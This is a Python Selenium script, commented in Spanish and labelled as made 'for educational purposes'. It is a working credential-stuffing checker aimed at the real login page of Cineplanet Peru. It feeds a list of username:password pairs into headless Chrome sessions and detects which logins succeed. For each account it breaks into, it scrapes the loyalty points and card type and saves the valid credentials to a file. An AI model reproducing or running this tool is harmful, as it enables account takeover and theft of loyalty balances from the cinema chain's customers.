#I made this for educationals purposes

def main():
    os.system('cls')
    #credenciales = input('Ingresa el nombre de tu txt: ')
    credenciales = 'credenciales.txt'
    #num_bots = int(input("Por favor, introduce el número de bots: "))
    num_bots = 1
    if not credenciales.endswith('.txt'):
        credenciales += '.txt'
    with open(credenciales, 'r', encoding='utf-8') as txt:
        logins = [linea.strip().split(':') for linea in txt]
    processed_logins = get_processed_logins()
    logins = filter_logins(logins, processed_logins)
    print(f"{Fore.GREEN}[INFO] --> Se encontraron {len(logins)} logins.")
    with ThreadPoolExecutor(max_workers=num_bots) as executor:
        executor.map(handle, logins)  



#import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from concurrent.futures import ThreadPoolExecutor
import time 
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from selenium import webdriver
from colorama import Fore
#from selenium.webdriver.edge.service import Service
import os 
from seleniumbase import Driver


def navega():
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")
    #options.add_experimental_option("prefs", {"credentials_enable_service": False})
    #driver = Driver(headless=False)
    driver = webdriver.Chrome(options=options)

    driver.set_window_size(400,915)
    driver.get('https://www.cineplanet.com.pe/autenticacion/login')
    driver.get('https://www.cineplanet.com.pe/autenticacion/login')
    driver.set_window_size(400,915)
    WebDriverWait(driver, 15).until(EC.element_to_be_clickable((By.CSS_SELECTOR,
                                                                '.button.call-to-action.call-to-action_rounded-solid.call-to-action_pink-solid.call-to-action_medium.call-to-action_rounded-solid.call-to-action_blue-solid.call-to-action_medium'))).click()

    return driver

def elemento_presente(driver, selector, *textos):
    try:
        elementos = driver.find_elements(By.CSS_SELECTOR, selector)
        for elemento in elementos:
            if any(texto in elemento.text for texto in textos):
                return True
        return False
    except NoSuchElementException:
        return False

def check_login(driver):
    time.sleep(3)
    start_time = time.time()
    timeout = 5

    while time.time() - start_time < timeout:
        try:
            current_url = driver.current_url
            if current_url == "https://www.cineplanet.com.pe/autenticacion/login":
                return False  
            else:
                driver.get('https://www.cineplanet.com.pe/mi-cuenta/mis-beneficios')
                return True  
        except TimeoutException:
            pass

        time.sleep(0.2)

    return False 


def get_processed_logins():
    try:
        with open('processed_logins.txt', 'r') as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def filter_logins(logins, processed_logins):
    filtered_logins = []
    for login in logins:
        if len(login) == 2 and f"{login[0]}:{login[1]}" not in processed_logins:
            filtered_logins.append(login)

    return filtered_logins
  

def write_to_file(filename, text):
    with open(filename, 'a') as f:
        f.write(text)

def captura(driver):
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#root > div > div > div.autocomplete-container--app > div.my-account > div.my-account--wrapper > div:nth-child(2) > div > div.my-account--column-right > div > div:nth-child(2) > div.stat--points > div.stat--points--total')))
    data = driver.find_element(By.CSS_SELECTOR,'#root > div > div > div.autocomplete-container--app > div.my-account > div.my-account--wrapper > div:nth-child(2) > div > div.my-account--column-right > div > div:nth-child(2) > div.stat--points > div.stat--points--total')
    image_element = driver.find_element(By.CLASS_NAME, "my-account--card-image")
    alt_text = image_element.get_attribute("alt")
    puntos = data.text



    with open('viendodata.txt', 'w') as viendo:
        viendo.write(data.text)

    return f'Puntos: {puntos} | Tipo de Tarjeta: {alt_text}'

def enviar_login(driver,usuario, password):
    WebDriverWait(driver,10).until(EC.element_to_be_clickable((By.NAME, 'cineplanet-code')))
    WebDriverWait(driver,10).until(EC.presence_of_element_located((By.NAME, 'cineplanet-code'))).send_keys(usuario)
    WebDriverWait(driver,10).until(EC.presence_of_element_located((By.NAME, 'password'))).send_keys(password)
    WebDriverWait(driver,10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'button.call-to-action.submit-button--button.call-to-action_rounded-solid.call-to-action_blue-solid.call-to-action_small.call-to-action_fullsized'))).click()


def procces_login(driver, usuario, password):
    enviar_login(driver, usuario, password)
    login_status = check_login(driver)
    return login_status


def handle(logins):
    usuario, password = logins
    driver = navega()
    try:
        status = procces_login(driver, usuario, password)
        if status:
                                    
            data = captura(driver)
            #print(f'{Fore.GREEN}[!] CREDENCIALES CORRECTAS!: {Fore.BLUE}usuario: {usuario} | {data}')
            write_to_file('correct_logins.txt', f"{usuario}:{password} {data}\n")
        else:
            #print(f'{Fore.RED}[!] CREDENCIALES INCORRECTAS: {usuario} | password: {password}')
            pass
    finally:
        driver.quit()
        write_to_file('processed_logins.txt', f"{usuario}:{password}\n")


if __name__ == "__main__":
    main()



